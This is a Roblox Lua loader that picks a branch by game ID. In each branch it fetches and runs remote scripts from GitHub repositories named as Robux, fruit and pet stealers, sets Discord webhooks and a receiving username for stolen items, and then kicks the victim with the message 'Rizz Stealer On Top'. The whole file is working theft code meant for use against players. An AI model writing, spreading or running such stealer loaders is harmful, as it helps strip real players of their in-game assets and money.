local GameID = game.PlaceId

local BLF_IDS = {
    [2753915549] = true,
    [4442272183] = true,
    [7449423635] = true
}

function KickAfterDelay()
    task.spawn(function()
        wait(20)
        game.Players.LocalPlayer:Kick("Rizz Stealer On Top")
    end)
end

if GameID == 18901165922 then
    Username = "NoobAliveForever"
    Webhook = "https://discord.com/api/webhooks/..."
    _G.ScriptName = "Rizz Scriptz"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/kk4ft/rizzhub/main/petsgo.lua"))()
    KickAfterDelay()

elseif GameID == 8737602449 then
    Username = "NoobAliveForever"
    Webhook = "https://discord.com/api/webhooks/..."
    loadstring(game:HttpGet("https://raw.githubusercontent.com/UrbanDEV0/Pls-Donate-RobuxStealer/refs/heads/main/lua"))()
    KickAfterDelay()

elseif BLF_IDS[GameID] then
    HitsWebhook = "https://discord.com/api/webhooks/..."
    Executions_Webhook = "https://discord.com/api/webhooks/..."
    Username = "NoobAliveForever"
    Button_Prompt = "E"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/UrbanDEV0/Bloxfruits-FruitStealer/refs/heads/main/lua"))()
    KickAfterDelay()

else
    Username = "NoobAliveForever"
    Username2 = "NoobAliveForever"
    Webhook = "https://discord.com/api/webhooks/..."
    _G.ScriptName = "Rizz Scriptz"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/kk4ft/rizzhub/main/PS99.lua"))()
    KickAfterDelay()
end